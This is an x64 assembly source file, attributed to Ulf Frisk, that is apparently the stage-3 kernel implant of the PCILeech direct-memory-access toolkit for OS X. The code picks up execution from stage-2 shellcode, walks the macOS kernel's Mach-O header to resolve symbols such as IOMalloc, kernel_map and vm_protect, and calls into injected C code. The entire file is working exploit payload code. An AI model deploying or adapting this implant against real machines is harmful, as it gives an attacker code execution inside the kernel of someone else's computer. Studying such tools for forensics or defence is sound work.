; ax64_stage3.asm : assembly to receive execution from stage2 shellcode.
; Compatible with OS X.
;
; (c) Ulf Frisk, 2016
; Author: Ulf Frisk, pcileech@frizk.net
;

EXTRN stage3_c_EntryPoint:NEAR

.CODE

main PROC
	; ----------------------------------------------------
	; 1: SAME INITIAL BYTE SEQUENCE AS win7x64_stage3_pre.asm
	; ----------------------------------------------------
	label_main_base:
	LEA rax, label_main_base-8h
	MOV rax, [rax]
	CMP rax, 0
	JZ label_main_base
	; ----------------------------------------------------
	; 2: CALL C CODE
	; ----------------------------------------------------
	LEA rcx, label_main_base - 1000h ; address of data page in parameter 1
	ENTER 20h, 0
	CALL stage3_c_EntryPoint
	LEAVE
	; ----------------------------------------------------
	; 3: RESTORE AND JMP BACK
	; ----------------------------------------------------
	RET
main ENDP

; ----------------------------------------------------
; TRIVIAL VERSION OF STRCMP
; destroyed registers :: <none>
; rdi -> ptr to str1
; rsi -> ptr to str2
; rax <- 0 == success, !0 == fail
; ----------------------------------------------------
strcmp_simple PROC
	PUSH rcx
	XOR rcx, rcx
	DEC rcx
	loop_strcmp:
	INC rcx
	MOV al, [rdi+rcx]
	CMP al, [rsi+rcx]
	JNE error
	CMP al, 0
	JNE loop_strcmp
	XOR rax, rax
	POP rcx
	RET
	error:
	MOV al, 1
	POP rcx
	RET
strcmp_simple ENDP

; ----------------------------------------------------
; LOCATE THE __LINKEDIT END ADDRESS BY SEARCHING THE MACH-O HEADER.
; destroyed registers :: rcx
; rdi -> macho_header address
; rax <- resulting address (zero if error)
; ----------------------------------------------------
macho_parse_find_linkedit_end_addr PROC
	MOV eax, 0FEEDFACFh			; mach_header_64 magic
	CMP eax, [rdi]
	JNE error
	MOV eax, 01000007h			; mach_header_64 cputype
	CMP eax, [rdi+4]
	JNE error

	XOR rcx, rcx
	MOV rax, 044454B4E494C5F5Fh		; __LINKED
	loop_search_linkedit:
	CMP rax, [rdi+rcx]
	JE success_search_linkedit
	ADD rcx, 4
	CMP rcx, 2000h
	JE error
	JMP loop_search_linkedit

	success_search_linkedit:
	MOV rax, [rdi+rcx+10h]
	ADD rax, [rdi+rcx+18h]
	RET

	error:
	XOR rax, rax
	RET
macho_parse_find_linkedit_end_addr ENDP

; ----------------------------------------------------
; parse mach-o header to find symtab location.
; NB! no sanity checks performed !!!
; destroyed registers :: rcx
; rdi -> macho_header address
; rax <- resulting address (zero if error)
; ----------------------------------------------------
macho_parse_find_symtab PROC
	MOV rcx, rdi
	ADD rcx, 20h
	
	loop_search_symtab:
	MOV eax, 2
	CMP [rcx], eax
	JE success_search_symtab
	MOV eax, [rcx+4]
	ADD rcx, rax
	JMP loop_search_symtab
	
	success_search_symtab:
	MOV rax, rcx
	RET
macho_parse_find_symtab ENDP

; ----------------------------------------------------
; FIND EXPORTED SYMBOL IN THE MACOS-X KERNEL IMAGE
; Function parses the MACH-O header. The symbol string section
; is located at the end of the __LINKEDIT segment. The function
; table is located just before the symbol string section at the
; end of __LINKEDIT. The size of the function table is found in
; the symtab in the mach-o header.
; destroyed registers :: rcx, r8, r9
; rcx -> rdi -> macho_header address
; rdx -> rsi -> ptr to function name
; rax <- resulting address (zero if error)
; ----------------------------------------------------
LookupFunctionOSX PROC
	; ecx = counter
	; r8  = symtab_command address
	; r9  = symbol_table_current address
	; r10 = string_table_address
	PUSH r10
	PUSH rdi
	PUSH rsi
	MOV rdi, rcx
	MOV rsi, rdx

	CALL macho_parse_find_symtab
	MOV r8, rax
	CALL macho_parse_find_linkedit_end_addr
	MOV r9, rax
	MOV eax, [r8+14h]		; symtab_command->strsize
	SUB r9, rax
	MOV r10, r9

	; SET UP LOOP
	MOV ecx, [r8+0Ch]		; symtab_command->nsyms
	
	finder_loop:
	SUB r9, 10h
	MOV rax, [r9+08h]
	SHR rax, 32
	CMP eax, 0ffffff80h
	JNE finder_loop_next_or_exit

	MOV edi, [r9]
	ADD rdi, r10
	CALL strcmp_simple
	CMP rax, 0
	JE finder_loop_success

	finder_loop_next_or_exit:
	LOOP finder_loop
	XOR rax, rax
	POP rsi
	POP rdi
	POP r10
	RET

	finder_loop_success:
	MOV rax, [r9+08h]
	POP rsi
	POP rdi
	POP r10
	RET 
LookupFunctionOSX ENDP

; ----------------------------------------------------
; Lookup functions in the OSX kernel image.
; This function is called by the c-code.
; rcx = macho_header address
; rdx = ptr to FNOSX struct
; rax <- TRUE(1)/FALSE(0)
; ----------------------------------------------------
LookupFunctionsDefaultOSX PROC
	; ----------------------------------------------------
	; 0: SET UP / STORE NV-REGISTERS
	; ----------------------------------------------------
	PUSH r15
	PUSH r14
	PUSH r13
	MOV r15, rcx				; address of macho_header
	MOV r14, rdx				; ptr to FNLX struct 
	MOV r13, 11*8				; num functions * 8
	; ----------------------------------------------------
	; 1: PUSH FUNCTION NAME POINTERS ON STACK
	; ----------------------------------------------------
	LEA rax, str_kernel_map
	PUSH rax
	LEA rax, str_PE_state
	PUSH rax
	LEA rax, str_IOFree
	PUSH rax
	LEA rax, str_IOFreeContiguous
	PUSH rax
	LEA rax, str_IOMalloc
	PUSH rax
	LEA rax, str_IOMallocContiguous
	PUSH rax
	LEA rax, str_IOSleep
	PUSH rax
	LEA rax, str_memcmp
	PUSH rax
	LEA rax, str_memcpy
	PUSH rax
	LEA rax, str_memset
	PUSH rax
	LEA rax, str_vm_protect
	PUSH rax
	; ----------------------------------------------------
	; 2: LOOKUP FUNCTION POINTERS BY NAME
	; ----------------------------------------------------
	lookup_loop:
	SUB r13, 8
	MOV rcx, r15
	POP rdx
	CALL LookupFunctionOSX
	TEST rax, rax
	JZ lookup_fail
	MOV [r14+r13], rax
	TEST r13, r13
	JNZ lookup_loop
	; ----------------------------------------------------
	; 3: RESTORE NV REGISTERS AND RETURN
	; ----------------------------------------------------
	POP r13
	POP r14
	POP r15
	MOV rax, 1
	RET
	lookup_fail:
	XOR rax, rax
	RET
LookupFunctionsDefaultOSX ENDP

str_kernel_map			db '_kernel_map', 0
str_PE_state			db '_PE_state', 0
str_IOFree				db '_IOFree', 0
str_IOFreeContiguous	db '_IOFreeContiguous', 0
str_IOMalloc			db '_IOMalloc', 0
str_IOMallocContiguous	db '_IOMallocContiguous', 0
str_IOSleep				db '_IOSleep', 0
str_memcmp				db '_memcmp', 0
str_memcpy				db '_memcpy', 0
str_memset				db '_memset', 0
str_vm_protect			db '_vm_protect', 0

; ------------------------------------------------------------------
; Convert from the Windows X64 calling convention to the SystemV
; X64 calling convention used by Linux. A maximum of five (5)
; parameters in addition to the function ptr can be supplied.
; QWORD SysVCall(QWORD fn, QWORD p1, QWORD p2, QWORD p3, QWORD p4, QWORD p5);
; QWORD SysVCall(QWORD fn, ...);
; ------------------------------------------------------------------
SysVCall PROC
	MOV rax, rcx
	PUSH rdi
	PUSH rsi
	MOV rdi, rdx
	MOV rsi, r8
	MOV rdx, r9
	MOV rcx, [rsp+28h+2*8+00h] ; 20h stack shadow space + 8h (RET) + 2*8h PUSH + xxh offset
	MOV r8,  [rsp+28h+2*8+08h]
	MOV r9,  [rsp+28h+2*8+10h]
	PUSH r15
	MOV r15, rsp
	AND rsp, 0FFFFFFFFFFFFFFF0h
	SUB rsp, 020h
	CALL rax
	MOV rsp, r15
	POP r15
	POP rsi
	POP rdi
	RET
SysVCall ENDP

PageFlush PROC
	MOV rax, cr3
	MOV cr3, rax
	RET
PageFlush ENDP

GetCR3 PROC
	MOV rax, cr3
	RET
GetCR3 ENDP

END
